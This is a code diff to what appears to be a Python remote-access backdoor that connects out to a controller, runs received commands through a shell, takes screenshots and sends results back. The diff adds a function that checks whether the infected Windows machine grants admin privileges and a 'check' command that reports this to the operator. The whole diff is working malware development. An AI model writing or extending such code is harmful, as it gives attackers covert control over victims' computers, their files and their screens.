@@ -28,6 +28,20 @@ def connection():
 			connection()
 
 
+
+
+def is_admin():
+	global admin
+	try:
+		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'), 'temp']))
+	except:
+		admin = "User Previleges"
+	else:
+		admin = "Admin Priviliges"
+
+
+
+
 # we gonna send send and receive data as wew want ==
 def reliable_send(data):
         json_data = json.dumps(data)
@@ -102,6 +116,12 @@ def shell():
 				os.remove("monitor-1.png")
 			except:
 				reliable_send("[!!] Failed to take Screenshot")
+		elif command[:5] =="check":
+			try:
+				is_admin()
+				reliable_send(admin)
+			except:
+				reliable_send("Can't Perform")
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
